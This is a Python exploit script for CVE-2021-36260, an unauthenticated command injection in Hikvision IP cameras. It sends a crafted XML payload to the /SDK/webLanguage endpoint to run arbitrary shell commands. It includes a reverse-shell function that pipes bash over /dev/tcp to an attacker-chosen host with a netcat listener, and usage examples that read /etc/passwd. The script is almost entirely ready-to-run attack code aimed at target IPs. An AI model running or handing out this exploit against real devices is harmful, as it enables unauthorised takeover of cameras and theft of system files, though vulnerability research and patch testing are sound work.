#!/usr/bin/env python3
"""
CVE-2021-36260 — Hikvision IP Camera Unauthenticated RCE
Command injection via /SDK/webLanguage endpoint.

Affected: Hikvision cameras running firmware before Sep 2021
CVSS:     9.8 CRITICAL
Usage:    python3 hikvision_cve_2021_36260.py <target_ip> [port] [command]
"""

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_vulnerable(target_ip: str, port: int = 80) -> bool:
    """Quick check — does the endpoint accept PUT requests?"""
    url = f"http://{target_ip}:{port}/SDK/webLanguage"
    try:
        r = requests.get(url, timeout=5, verify=False)
        return r.status_code in (200, 401, 403, 405)
    except Exception:
        return False


def exploit(target_ip: str, port: int = 80, command: str = "id") -> dict:
    """
    Inject a command via the XML language parameter.
    The device evaluates shell $(command) inside the XML value.
    """
    url = f"http://{target_ip}:{port}/SDK/webLanguage"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<language>$({command})</language>'
    )

    result = {"ip": target_ip, "port": port, "command": command,
              "vulnerable": False, "output": "", "error": ""}
    try:
        r = requests.put(url, data=payload, headers=headers,
                         verify=False, timeout=10)
        result["http_status"] = r.status_code

        if r.status_code == 200:
            result["vulnerable"] = True
            result["output"] = r.text[:2000]
            print(f"[+] {target_ip}:{port} — VULNERABLE to CVE-2021-36260")
            print(f"[+] HTTP {r.status_code}")
            print(f"[+] Response:\n{r.text[:500]}")
        elif r.status_code == 400:
            # Some versions respond 400 but still execute
            result["vulnerable"] = True
            result["output"] = r.text[:2000]
            print(f"[!] {target_ip}:{port} — Possibly vulnerable (HTTP 400, cmd may have run)")
            print(f"[!] Response:\n{r.text[:200]}")
        else:
            print(f"[-] {target_ip}:{port} — HTTP {r.status_code} (likely not vulnerable)")
    except requests.exceptions.ConnectionError:
        result["error"] = "Connection refused"
        print(f"[-] {target_ip}:{port} — Connection refused")
    except requests.exceptions.Timeout:
        result["error"] = "Timeout"
        print(f"[-] {target_ip}:{port} — Timeout after 10s")
    except Exception as e:
        result["error"] = str(e)
        print(f"[-] Error: {e}")

    return result


def reverse_shell(target_ip: str, lhost: str, lport: int, port: int = 80) -> dict:
    """Attempt to spawn a reverse shell (requires listener on lhost:lport)."""
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    print(f"[*] Sending reverse shell to {lhost}:{lport}…")
    print(f"[*] Start your listener:  nc -lvnp {lport}")
    return exploit(target_ip, port, cmd)


def main():
    if len(sys.argv) < 2:
        print(f"Usage:  {sys.argv[0]} <target_ip> [port] [command]")
        print(f"        {sys.argv[0]} 192.168.1.100 80 id")
        print(f"        {sys.argv[0]} 192.168.1.100 80 'cat /etc/passwd'")
        sys.exit(1)

    ip   = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    cmd  = sys.argv[3] if len(sys.argv) > 3 else "id"

    print(f"[*] Target : {ip}:{port}")
    print(f"[*] Command: {cmd}")
    print(f"[*] CVE    : CVE-2021-36260 — Hikvision RCE\n")

    if not check_vulnerable(ip, port):
        print(f"[-] {ip}:{port} — endpoint unreachable, aborting")
        sys.exit(1)

    exploit(ip, port, cmd)


if __name__ == "__main__":
    main()
